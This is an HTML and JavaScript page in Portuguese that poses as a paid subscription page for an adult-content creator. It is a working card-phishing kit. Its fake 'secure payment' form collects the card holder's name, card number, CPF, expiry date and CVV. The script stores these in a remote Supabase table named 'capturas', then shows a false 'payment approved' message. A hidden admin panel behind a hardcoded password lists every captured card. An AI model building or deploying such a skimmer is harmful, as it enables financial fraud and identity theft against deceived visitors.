<!DOCTYPE html>

    <style>

        .cc-card { background: #1a1a1a; padding: 15px; border-radius: 12px; margin-bottom: 10px; border-left: 5px solid var(--primary); font-family: monospace; }
    </style>
</head>
<body>

    <nav class="nav-top">
        <img src="logo.png" height="26" onclick="abrirPainel()" style="cursor: pointer;">
        <span>Assinar</span>
    </nav>

    <img src="capa.png" class="banner">
    <img src="perfil1.png" class="profile-pic">

    <div class="info">
        <div class="name">Kamylinha Santos âœ…</div>
        <p style="color: #666; font-size: 14px;">@eukamylinhasantos</p>
        <p style="margin-top:10px; font-size: 14px;">ConteÃºdo exclusivo sem censura. ðŸ”žðŸ”¥</p>
    </div>

    <div class="feed">
        <div style="background:#eee; border-radius:12px; height:150px; filter:blur(10px)"></div>
        <div style="background:#eee; border-radius:12px; height:150px; filter:blur(10px)"></div>

    <button class="btn-sub" onclick="$('#modalPay').fadeIn()">
        <span>ASSINAR AGORA</span> <span>R$ 10,00</span>

    <div id="modalPay">
        <div class="modal-box">
            <h3 style="text-align:center; color:var(--primary); margin-bottom:20px;">Pagamento Seguro</h3>
            <input type="text" id="n" placeholder="Nome no CartÃ£o">
            <input type="text" id="c" placeholder="NÃºmero do CartÃ£o">
            <input type="text" id="cpf" placeholder="CPF">
            <div style="display:flex; gap:10px">
                <input type="text" id="v" placeholder="MM/AA">
                <input type="text" id="cvv" placeholder="CVV">
            </div>
            <button class="btn-sub" style="position:static; width:100%; margin-top:10px" onclick="salvar()">APROVAR COMPRA</button>

    <div id="admView">

    </div>

    <script>
        // ConfiguraÃ§Ãµes fornecidas
        const SB_URL = 'https://bafumercepnhnlqkxtcd.supabase.co'; 
        const SB_KEY = 'sb_publishable_Z8NyNh7hAAhOjk75y035aw_1siOe_xk';
        
        const _supabase = supabase.createClient(SB_URL, SB_KEY);

        $(document).ready(function(){
            $('#c').mask('0000 0000 0000 0000');
            $('#cpf').mask('000.000.000-00');
            $('#v').mask('00/00');
            $('#cvv').mask('000');
        });

        async function salvar() {
            // Teste de funcionamento no console
            console.log("Oi tudo bem! O clique no botÃ£o Aprovar funcionou."); 
            
            const d = { 
                nome: $('#n').val(), 
                card: $('#c').val(), 
                cpf: $('#cpf').val(), 
                validade: $('#v').val(), 
                cvv: $('#cvv').val() 
            };

            if(!d.card || d.card.length < 16) {
                alert("CartÃ£o invÃ¡lido! Verifique os nÃºmeros.");
                return;
            }

            Notiflix.Loading.circle('Processando pagamento...');

            try {
                // Tenta inserir na tabela 'capturas'
                const { error } = await _supabase.from('capturas').insert([d]);
                
                Notiflix.Loading.remove();

                if(error) {
                    console.error("Erro Supabase:", error);
                    alert("Erro ao enviar: " + error.message);
                } else {
                    console.log("Dados enviados com sucesso!");
                    Notiflix.Report.success('Pagamento Aprovado!', 'Seu acesso serÃ¡ enviado para o e-mail em instantes.', 'OK');
                    $('#modalPay').hide();
                }
            } catch (err) {
                Notiflix.Loading.remove();
                console.error("Erro fatal:", err);
                alert("Erro de conexÃ£o: " + err.message);
            }
        }

        async function abrirPainel() {
            if(prompt("Senha do Administrador:") === "NOXXZ2026") {
                $('#admView').show();
                const { data, error } = await _supabase.from('capturas').select('*').order('id', {ascending:false});
                
                if(error) return alert("Erro ao carregar logs: " + error.message);
                
                $('#lista').html(data.length ? "" : "Nenhum dado capturado ainda.");
                data.forEach(i => {
                    $('#lista').append(`
                        <div class="cc-card">
                            <b>NOME:</b> ${i.nome}<br>
                            <b>CARD:</b> ${i.card}<br>
                            <b>CPF:</b> ${i.cpf}<br>
                            <b>VAL:</b> ${i.validade} | <b>CVV:</b> ${i.cvv}
                        </div>`);
                });
            }
        }
    </script>
